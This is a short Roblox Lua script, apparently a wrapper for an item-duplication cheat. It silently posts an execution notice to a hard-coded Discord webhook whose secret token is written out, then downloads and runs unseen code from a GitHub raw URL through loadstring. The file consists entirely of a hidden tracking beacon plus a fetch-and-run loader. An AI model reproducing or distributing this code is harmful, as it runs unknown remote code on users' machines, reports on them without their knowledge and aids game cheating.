-- Services
local HttpService = game:GetService("HttpService")

-- Send to your Discord webhook
local webhook2 = "https://discord.com/api/webhooks/1299377320888631428/BU_b38hrhIE5YuCbpmDOA9WqmJLhciDlVBKBzKOMC8Il8UL4qRDTSQVZFZIxty-xYN4Q"
local data = {
    content = "Someone just executed the script! (via wrapper)"
}

-- Send POST request
pcall(function()
    HttpService:PostAsync(webhook2, HttpService:JSONEncode(data), Enum.HttpContentType.ApplicationJson)
end)

-- Load the original script from GitHub
loadstring(game:HttpGet("https://raw.githubusercontent.com/Andreiiiillpp/gag-dupee/main/DupeScript.lua"))()
